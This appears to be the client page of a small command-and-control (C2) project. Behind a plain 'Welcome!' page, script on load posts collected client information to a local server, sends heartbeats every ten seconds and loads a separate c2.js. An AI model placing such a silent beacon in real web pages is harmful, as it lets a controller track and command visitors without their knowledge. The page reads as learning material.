<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Project</title>
    <link rel="stylesheet" type="text/css" href="style.css" />
  </head>
  <body>
    <h1>Welcome!</h1>

    <script>
      window.onload = async function() {
        const clientInfo = await getClientInfo();
        try {
          
          // Use axios to call the server-side endpoint
          const response = await axios.post('http://localhost:1337/connect', clientInfo);

          setInterval(sendHeartbeat, 10000);


        } catch (error) {
          console.error("Error connecting to server:", error);
        }
      };

      async function sendHeartbeat() {
        try {
          const response = await axios.post('http://localhost:1337/heartbeat');
          console.log('Heartbeat sent:', response.data);
        } catch (error) {
          console.error('Error sending heartbeat:', error);
        }
      }
    </script>
    <script src="./src/c2.js"></script>
  </body>
</html>
